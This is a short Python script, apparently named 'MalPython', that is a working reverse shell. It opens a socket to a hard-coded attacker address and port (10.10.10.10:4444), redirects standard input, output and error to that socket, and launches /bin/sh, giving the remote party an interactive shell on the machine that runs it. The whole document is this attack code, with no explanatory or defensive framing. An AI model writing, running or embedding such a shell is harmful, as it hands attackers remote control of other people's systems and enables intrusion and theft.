# MalPython
#
# reverse shell 

import socket,subprocess,os

ATTACKER="10.10.10.10"
PORT=4444

s = socket.socket()
s.connect((ATTACKER, PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])